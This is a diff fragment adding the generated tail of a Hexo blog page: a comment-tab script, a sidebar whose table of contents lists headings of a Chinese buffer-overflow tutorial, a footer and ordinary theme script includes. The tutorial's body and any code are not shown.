+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1、缓冲区溢出"><span class="nav-number">1.</span> <span class="nav-text">1、缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1缓冲区溢出条件："><span class="nav-number">1.1.</span> <span class="nav-text">1.1缓冲区溢出条件：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结论"><span class="nav-number">1.2.</span> <span class="nav-text">结论:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2、实例-用缓冲区溢出的方式打开记事本notepad"><span class="nav-number">2.</span> <span class="nav-text">2、实例 (用缓冲区溢出的方式打开记事本notepad)#</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3、推而广之"><span class="nav-number">3.</span> <span class="nav-text">3、推而广之</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1前言"><span class="nav-number">3.1.</span> <span class="nav-text">3.1前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2兼容性解决"><span class="nav-number">3.2.</span> <span class="nav-text">3.2兼容性解决</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4、后记"><span class="nav-number">4.</span> <span class="nav-text">4、后记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="绯狱丸丶"
+      src="/hexo-test/images/ouba.jpg">
+  <p class="site-author-name" itemprop="name">绯狱丸丶</p>
+  <div class="site-description" itemprop="description">DHR‘s Blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/hexo-test/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/hexo-test/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/hexo-test/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/d2372017513" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;d2372017513" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/hexo-test/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">绯狱丸丶</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">13k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11 分钟</span>
+</div>
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/hexo-test/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/hexo-test/lib/velocity/velocity.min.js"></script>
+  <script src="/hexo-test/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/hexo-test/js/utils.js"></script>
+
+<script src="/hexo-test/js/motion.js"></script>
+
+
+<script src="/hexo-test/js/schemes/pisces.js"></script>
+
+
+<script src="/hexo-test/js/next-boot.js"></script>
+
+<script src="/hexo-test/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/hexo-test/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/hexo-test/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/hexo-test/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="/hexo-test/js/snow.js"></script>
+<!-- 切换页面标题变化-->
+<script type = "text/javascript" src = "/hexo-test/js/FunnyTile.js"></script>
